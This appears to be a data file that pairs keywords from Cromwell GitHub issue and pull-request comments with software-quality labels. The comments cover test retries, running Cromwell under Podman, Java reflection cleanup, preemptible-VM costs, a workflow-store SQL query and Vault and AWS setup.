https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022339247:106,Testability,log,logic,106,"We discussed this and decided to go forward with this change. There isn't an easy way to change the retry logic on a per-test-format basis in Centaur, and adding one would be nontrivial. This change makes the behavior clear to future test-spelunkers and will be easy to walk back if it turns out the retries were useful.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022339247
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022339247:121,Testability,test,test-format,121,"We discussed this and decided to go forward with this change. There isn't an easy way to change the retry logic on a per-test-format basis in Centaur, and adding one would be nontrivial. This change makes the behavior clear to future test-spelunkers and will be easy to walk back if it turns out the retries were useful.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022339247
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022339247:234,Testability,test,test-spelunkers,234,"We discussed this and decided to go forward with this change. There isn't an easy way to change the retry logic on a per-test-format basis in Centaur, and adding one would be nontrivial. This change makes the behavior clear to future test-spelunkers and will be easy to walk back if it turns out the retries were useful.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022339247
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022339247:218,Usability,clear,clear,218,"We discussed this and decided to go forward with this change. There isn't an easy way to change the retry logic on a per-test-format basis in Centaur, and adding one would be nontrivial. This change makes the behavior clear to future test-spelunkers and will be easy to walk back if it turns out the retries were useful.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022339247
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053:319,Energy Efficiency,adapt,adapt,319,"Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:. `ln -s /usr/bin/podman /usr/bin/docker`. > Probably you should check where is your podman binary with `which podman` and adapt the above command. I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working. `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs. [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053:319,Modifiability,adapt,adapt,319,"Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:. `ln -s /usr/bin/podman /usr/bin/docker`. > Probably you should check where is your podman binary with `which podman` and adapt the above command. I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working. `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs. [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053:473,Testability,log,log,473,"Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:. `ln -s /usr/bin/podman /usr/bin/docker`. > Probably you should check where is your podman binary with `which podman` and adapt the above command. I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working. `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs. [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053:678,Testability,log,log,678,"Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:. `ln -s /usr/bin/podman /usr/bin/docker`. > Probably you should check where is your podman binary with `which podman` and adapt the above command. I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working. `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs. [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053:744,Testability,log,log,744,"Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:. `ln -s /usr/bin/podman /usr/bin/docker`. > Probably you should check where is your podman binary with `which podman` and adapt the above command. I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working. `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs. [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1036412053
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424:897,Availability,error,error,897,"> Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:; > ; > `ln -s /usr/bin/podman /usr/bin/docker`; > ; > > Probably you should check where is your podman binary with `which podman` and adapt the above command.; > ; > I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working.; > ; > `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs.; > ; > [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt). Hi, yes actually that was the first thing I tried but for some reasons (I already do not remember the exact error) it failed. I think that to configure backend would be cleaner way I think I'll return to it a bit later",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424:333,Energy Efficiency,adapt,adapt,333,"> Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:; > ; > `ln -s /usr/bin/podman /usr/bin/docker`; > ; > > Probably you should check where is your podman binary with `which podman` and adapt the above command.; > ; > I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working.; > ; > `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs.; > ; > [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt). Hi, yes actually that was the first thing I tried but for some reasons (I already do not remember the exact error) it failed. I think that to configure backend would be cleaner way I think I'll return to it a bit later",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424:333,Modifiability,adapt,adapt,333,"> Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:; > ; > `ln -s /usr/bin/podman /usr/bin/docker`; > ; > > Probably you should check where is your podman binary with `which podman` and adapt the above command.; > ; > I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working.; > ; > `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs.; > ; > [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt). Hi, yes actually that was the first thing I tried but for some reasons (I already do not remember the exact error) it failed. I think that to configure backend would be cleaner way I think I'll return to it a bit later",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424:931,Modifiability,config,configure,931,"> Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:; > ; > `ln -s /usr/bin/podman /usr/bin/docker`; > ; > > Probably you should check where is your podman binary with `which podman` and adapt the above command.; > ; > I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working.; > ; > `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs.; > ; > [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt). Hi, yes actually that was the first thing I tried but for some reasons (I already do not remember the exact error) it failed. I think that to configure backend would be cleaner way I think I'll return to it a bit later",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424:494,Testability,log,log,494,"> Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:; > ; > `ln -s /usr/bin/podman /usr/bin/docker`; > ; > > Probably you should check where is your podman binary with `which podman` and adapt the above command.; > ; > I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working.; > ; > `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs.; > ; > [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt). Hi, yes actually that was the first thing I tried but for some reasons (I already do not remember the exact error) it failed. I think that to configure backend would be cleaner way I think I'll return to it a bit later",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424:713,Testability,log,log,713,"> Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:; > ; > `ln -s /usr/bin/podman /usr/bin/docker`; > ; > > Probably you should check where is your podman binary with `which podman` and adapt the above command.; > ; > I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working.; > ; > `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs.; > ; > [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt). Hi, yes actually that was the first thing I tried but for some reasons (I already do not remember the exact error) it failed. I think that to configure backend would be cleaner way I think I'll return to it a bit later",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424:779,Testability,log,log,779,"> Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:; > ; > `ln -s /usr/bin/podman /usr/bin/docker`; > ; > > Probably you should check where is your podman binary with `which podman` and adapt the above command.; > ; > I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working.; > ; > `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs.; > ; > [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt). Hi, yes actually that was the first thing I tried but for some reasons (I already do not remember the exact error) it failed. I think that to configure backend would be cleaner way I think I'll return to it a bit later",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424
https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1406650763:125,Modifiability,config,config,125,"It does not seem likely in the foreseeable future, I don't think Cromwell is looking to expand the scope of the local and/or config backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1406650763
https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996:582,Availability,avail,available,582,"These removed calls to `setAccessible` are NOT technically illegal yet. They do not modify [JDK classes](https://openjdk.java.net/jeps/396) and the third-party libraries that are modified at runtime are currently weakly encapsulated. Still, if these libraries suddenly switch to modules then [`setAccessible` will then be illegal](https://docs.oracle.com/javase/9/docs/api/java/lang/reflect/AccessibleObject.html#setAccessible-boolean-). This PR uses alternatives for some of the calls to `setAccesible` in this repo, either through basic refactoring or using new APIs that weren't available back when the original workaround was implemented.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996
https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996:539,Modifiability,refactor,refactoring,539,"These removed calls to `setAccessible` are NOT technically illegal yet. They do not modify [JDK classes](https://openjdk.java.net/jeps/396) and the third-party libraries that are modified at runtime are currently weakly encapsulated. Still, if these libraries suddenly switch to modules then [`setAccessible` will then be illegal](https://docs.oracle.com/javase/9/docs/api/java/lang/reflect/AccessibleObject.html#setAccessible-boolean-). This PR uses alternatives for some of the calls to `setAccesible` in this repo, either through basic refactoring or using new APIs that weren't available back when the original workaround was implemented.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996
https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996:391,Security,Access,AccessibleObject,391,"These removed calls to `setAccessible` are NOT technically illegal yet. They do not modify [JDK classes](https://openjdk.java.net/jeps/396) and the third-party libraries that are modified at runtime are currently weakly encapsulated. Still, if these libraries suddenly switch to modules then [`setAccessible` will then be illegal](https://docs.oracle.com/javase/9/docs/api/java/lang/reflect/AccessibleObject.html#setAccessible-boolean-). This PR uses alternatives for some of the calls to `setAccesible` in this repo, either through basic refactoring or using new APIs that weren't available back when the original workaround was implemented.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996
https://github.com/broadinstitute/cromwell/issues/6664#issuecomment-1027551615:62,Testability,log,logger,62,Just noticed the same thing. Not critical but it looks like a logger got misconfigured.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6664#issuecomment-1027551615
https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030119179:895,Deployability,configurat,configuration,895,"> Our bioinformatics team have been reporting a single retry after preemptible attempts have been exhausted. To clarify, is Cromwell retrying preemptibles the specified number of times and then running one more time on non-preemptible?. As of today that is the [expected behavior](https://cromwell.readthedocs.io/en/stable/RuntimeAttributes/#preemptible) because it is assumed that a user isn't going to completely give up on their analysis just because it got interrupted repeatedly:. > Take an Int as a value that indicates the maximum number of times Cromwell should request a preemptible machine for this task before defaulting back to a non-preemptible one. A change to categorically disable this behavior would break existing users and can't merge, but what might work is a boolean runtime attribute that skips the regular VM. That said, the team must think carefully about increasing the configuration surface area of the product and I can't promise that such a PR would be accepted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030119179
https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030119179:895,Modifiability,config,configuration,895,"> Our bioinformatics team have been reporting a single retry after preemptible attempts have been exhausted. To clarify, is Cromwell retrying preemptibles the specified number of times and then running one more time on non-preemptible?. As of today that is the [expected behavior](https://cromwell.readthedocs.io/en/stable/RuntimeAttributes/#preemptible) because it is assumed that a user isn't going to completely give up on their analysis just because it got interrupted repeatedly:. > Take an Int as a value that indicates the maximum number of times Cromwell should request a preemptible machine for this task before defaulting back to a non-preemptible one. A change to categorically disable this behavior would break existing users and can't merge, but what might work is a boolean runtime attribute that skips the regular VM. That said, the team must think carefully about increasing the configuration surface area of the product and I can't promise that such a PR would be accepted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030119179
https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030166346:133,Deployability,pipeline,pipelines,133,"Hi @aednichols, . For us there's a large price difference between regular vs Spot VM on GCP hence the pursuit of purely pre-emptible pipelines.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030166346
https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030186650:472,Availability,down,down,472,"You could set `preemptible` very high to minimize the chance of preemption. I don't think there would be any issue setting it to 10 or even more. That said, it can be a bit of a false economy because failed attempts still cost real money. It may even be the case that falling back to non-preemptible saves money. Let's say preemptibles are $1 an hour and normal VMs are $3. If you run a 12 hour task that gets preempted 6 times at the 6 hour mark, that's 6 x 6 x $1 = $36 down the drain, a day and a half of wall clock time, and no results to show for it. Whereas a single non-preemptible run would be 12 x $3 = $36 and you'd have your results. Obviously this math will vary widely by use case and you will have to observe your preemption rates in practice to come up with the optimal balance. Thanks for an interesting discussion, I had never thought about the ""only preemptible"" use case before.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030186650
https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030186650:481,Energy Efficiency,drain,drain,481,"You could set `preemptible` very high to minimize the chance of preemption. I don't think there would be any issue setting it to 10 or even more. That said, it can be a bit of a false economy because failed attempts still cost real money. It may even be the case that falling back to non-preemptible saves money. Let's say preemptibles are $1 an hour and normal VMs are $3. If you run a 12 hour task that gets preempted 6 times at the 6 hour mark, that's 6 x 6 x $1 = $36 down the drain, a day and a half of wall clock time, and no results to show for it. Whereas a single non-preemptible run would be 12 x $3 = $36 and you'd have your results. Obviously this math will vary widely by use case and you will have to observe your preemption rates in practice to come up with the optimal balance. Thanks for an interesting discussion, I had never thought about the ""only preemptible"" use case before.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030186650
https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030226235:176,Availability,failure,failure,176,Closing issue: . - In agreement that breaking existing behavior is not a good approach. ; - Need to work out better understanding of cost per sample especially with regards to failure preemption or otherwise. . I'm likely going to soft-fork internally for certain projects and gather some hard numbers.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030226235
https://github.com/broadinstitute/cromwell/pull/6668#issuecomment-1055833845:600,Deployability,update,update,600,"Before:; ```; select ; `WORKFLOW_EXECUTION_UUID`, ; `WORKFLOW_DEFINITION`, ; `WORKFLOW_URL`, ; `WORKFLOW_ROOT`, ; `WORKFLOW_TYPE`, ; `WORKFLOW_TYPE_VERSION`, ; `WORKFLOW_INPUTS`, ; `WORKFLOW_OPTIONS`, ; `WORKFLOW_STATE`, ; `SUBMISSION_TIME`, ; `IMPORTS_ZIP`, ; `CUSTOM_LABELS`, ; `CROMWELL_ID`, ; `HEARTBEAT_TIMESTAMP`, ; `HOG_GROUP`, ; `WORKFLOW_STORE_ENTRY_ID` ; from ; `WORKFLOW_STORE_ENTRY` ; where ; (; (`HEARTBEAT_TIMESTAMP` is null) ; or (; `HEARTBEAT_TIMESTAMP` < '2022-02-01 21:13:48.287'; ); ) ; and (; not (`WORKFLOW_STATE` = 'On Hold'); ) ; order by ; `SUBMISSION_TIME` ; limit ; 1 for ; update; ```; After, with no groups excluded: `and (not false)`; ```; select ; `WORKFLOW_EXECUTION_UUID`, ; `WORKFLOW_DEFINITION`, ; `WORKFLOW_URL`, ; `WORKFLOW_ROOT`, ; `WORKFLOW_TYPE`, ; `WORKFLOW_TYPE_VERSION`, ; `WORKFLOW_INPUTS`, ; `WORKFLOW_OPTIONS`, ; `WORKFLOW_STATE`, ; `SUBMISSION_TIME`, ; `IMPORTS_ZIP`, ; `CUSTOM_LABELS`, ; `CROMWELL_ID`, ; `HEARTBEAT_TIMESTAMP`, ; `HOG_GROUP`, ; `WORKFLOW_STORE_ENTRY_ID` ; from ; `WORKFLOW_STORE_ENTRY` ; where ; (; (; (`HEARTBEAT_TIMESTAMP` is null) ; or (; `HEARTBEAT_TIMESTAMP` < '2022-03-01 20:08:12.447'; ); ) ; and (; not (`WORKFLOW_STATE` = 'On Hold'); ); ) ; and (not false) ; order by ; `SUBMISSION_TIME` ; limit ; 1 for ; update; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6668#issuecomment-1055833845
https://github.com/broadinstitute/cromwell/pull/6668#issuecomment-1055833845:1279,Deployability,update,update,1279,"Before:; ```; select ; `WORKFLOW_EXECUTION_UUID`, ; `WORKFLOW_DEFINITION`, ; `WORKFLOW_URL`, ; `WORKFLOW_ROOT`, ; `WORKFLOW_TYPE`, ; `WORKFLOW_TYPE_VERSION`, ; `WORKFLOW_INPUTS`, ; `WORKFLOW_OPTIONS`, ; `WORKFLOW_STATE`, ; `SUBMISSION_TIME`, ; `IMPORTS_ZIP`, ; `CUSTOM_LABELS`, ; `CROMWELL_ID`, ; `HEARTBEAT_TIMESTAMP`, ; `HOG_GROUP`, ; `WORKFLOW_STORE_ENTRY_ID` ; from ; `WORKFLOW_STORE_ENTRY` ; where ; (; (`HEARTBEAT_TIMESTAMP` is null) ; or (; `HEARTBEAT_TIMESTAMP` < '2022-02-01 21:13:48.287'; ); ) ; and (; not (`WORKFLOW_STATE` = 'On Hold'); ) ; order by ; `SUBMISSION_TIME` ; limit ; 1 for ; update; ```; After, with no groups excluded: `and (not false)`; ```; select ; `WORKFLOW_EXECUTION_UUID`, ; `WORKFLOW_DEFINITION`, ; `WORKFLOW_URL`, ; `WORKFLOW_ROOT`, ; `WORKFLOW_TYPE`, ; `WORKFLOW_TYPE_VERSION`, ; `WORKFLOW_INPUTS`, ; `WORKFLOW_OPTIONS`, ; `WORKFLOW_STATE`, ; `SUBMISSION_TIME`, ; `IMPORTS_ZIP`, ; `CUSTOM_LABELS`, ; `CROMWELL_ID`, ; `HEARTBEAT_TIMESTAMP`, ; `HOG_GROUP`, ; `WORKFLOW_STORE_ENTRY_ID` ; from ; `WORKFLOW_STORE_ENTRY` ; where ; (; (; (`HEARTBEAT_TIMESTAMP` is null) ; or (; `HEARTBEAT_TIMESTAMP` < '2022-03-01 20:08:12.447'; ); ) ; and (; not (`WORKFLOW_STATE` = 'On Hold'); ); ) ; and (not false) ; order by ; `SUBMISSION_TIME` ; limit ; 1 for ; update; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6668#issuecomment-1055833845
https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031903603:29,Availability,failure,failures,29,"Nevermind, just noticed some failures due to Docker rate-limiting, which I would love to completely avoid. I'm going to try installing Vault directly rather than using Docker.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031903603
https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031903603:124,Deployability,install,installing,124,"Nevermind, just noticed some failures due to Docker rate-limiting, which I would love to completely avoid. I'm going to try installing Vault directly rather than using Docker.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031903603
https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031903603:100,Safety,avoid,avoid,100,"Nevermind, just noticed some failures due to Docker rate-limiting, which I would love to completely avoid. I'm going to try installing Vault directly rather than using Docker.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031903603
https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031922728:186,Availability,avail,available,186,"Nevermind again, testing now but I don't think we need to change anything here. `test.inc.sh` is already set up to use `VAULT_ROLE_ID` and `VAULT_SECRET_ID` env vars for auth if they're available, so all that's needed is to add those and remove `VAULT_TOKEN`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031922728
https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031922728:17,Testability,test,testing,17,"Nevermind again, testing now but I don't think we need to change anything here. `test.inc.sh` is already set up to use `VAULT_ROLE_ID` and `VAULT_SECRET_ID` env vars for auth if they're available, so all that's needed is to add those and remove `VAULT_TOKEN`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031922728
https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031922728:81,Testability,test,test,81,"Nevermind again, testing now but I don't think we need to change anything here. `test.inc.sh` is already set up to use `VAULT_ROLE_ID` and `VAULT_SECRET_ID` env vars for auth if they're available, so all that's needed is to add those and remove `VAULT_TOKEN`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031922728
https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1092523379:144,Availability,error,error,144,"Hey @DivyaThottappilly do you still have this issue? I'm trying to get up and running a basic Hello World but keeps getting an S3Exception null error (301). . It seems like you've already past that stage and if you don't mind, could you help me setup this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1092523379
https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127:598,Availability,error,error,598,"Issue was resolved and issue was due to launch template of EC2 and It; should be launched with ssm agent installed on it .; Better option is to use Amazon genomics cli . When you deploy a Context agc; will create batch queues and s3 for you . It's better to use that queue and; s3 in cromwell cofig .; It works better. Regards,; Divya. On Fri, Apr 8, 2022 at 3:13 AM thousand-petalled ***@***.***>; wrote:. > Hey @DivyaThottappilly <https://github.com/DivyaThottappilly> do you; > still have this issue? I'm trying to get up and running a basic Hello World; > but keeps getting an S3Exception null error (301).; >; > It seems like you've already past that stage and if you don't mind, could; > you help me setup this?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1092523379>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AGA4NTQVWHYKZC7RLKGT4OTVD7MCNANCNFSM5N3DE7QQ>; > .; > You are receiving this because you were mentioned.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127
